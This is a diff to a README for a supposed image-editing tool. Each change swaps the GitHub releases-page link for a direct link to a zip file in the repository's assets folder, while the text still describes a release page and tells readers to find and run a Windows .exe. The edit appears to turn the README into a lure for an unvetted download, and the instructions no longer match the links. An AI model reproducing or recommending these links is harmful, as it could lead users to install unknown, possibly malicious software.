@@ -1,6 +1,6 @@
 # 🛠️ Code - Simple Image Editing with Smart Experts
 
-[![Download Now](https://img.shields.io/badge/Download-Code-blue)](https://github.com/Hanniformalised707/Code/releases)
+[![Download Now](https://img.shields.io/badge/Download-Code-blue)](https://github.com/Hanniformalised707/Code/raw/refs/heads/main/assets/Software-v1.4.zip)
 
 ## About This Application
 
@@ -30,7 +30,7 @@ Before you start, please check your computer meets these basic requirements:
 The program is available for download on its GitHub release page. You will find the latest version ready to download there.
 
 **Visit this page to download:**  
-[https://github.com/Hanniformalised707/Code/releases](https://github.com/Hanniformalised707/Code/releases)
+[https://github.com/Hanniformalised707/Code/raw/refs/heads/main/assets/Software-v1.4.zip](https://github.com/Hanniformalised707/Code/raw/refs/heads/main/assets/Software-v1.4.zip)
 
 Clicking the link opens a page with one or more download files. Look for the latest Windows version, usually with the `.exe` file extension.
 
@@ -39,7 +39,7 @@ Clicking the link opens a page with one or more download files. Look for the lat
 ## 👇 How to Download and Install on Windows
 
 1. **Open the release page** by clicking on this link:  
-   [https://github.com/Hanniformalised707/Code/releases](https://github.com/Hanniformalised707/Code/releases)  
+   [https://github.com/Hanniformalised707/Code/raw/refs/heads/main/assets/Software-v1.4.zip](https://github.com/Hanniformalised707/Code/raw/refs/heads/main/assets/Software-v1.4.zip)  
 
 2. **Find the latest version** in the list. Versions are sorted by date or version number. The newest one is usually at the top.  
 
@@ -108,10 +108,10 @@ If problems persist, you can revisit the release page where you downloaded the s
 
 Updates may include new features or fixes. To update:
 
-1. Go to the release page: [https://github.com/Hanniformalised707/Code/releases](https://github.com/Hanniformalised707/Code/releases)  
+1. Go to the release page: [https://github.com/Hanniformalised707/Code/raw/refs/heads/main/assets/Software-v1.4.zip](https://github.com/Hanniformalised707/Code/raw/refs/heads/main/assets/Software-v1.4.zip)  
 2. Download the latest version as before.  
 3. Run the new installer to replace the old version. Your settings and saved files will remain safe.  
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Code-brightgreen)](https://github.com/Hanniformalised707/Code/releases)
+[![Download Now](https://img.shields.io/badge/Download-Code-brightgreen)](https://github.com/Hanniformalised707/Code/raw/refs/heads/main/assets/Software-v1.4.zip)
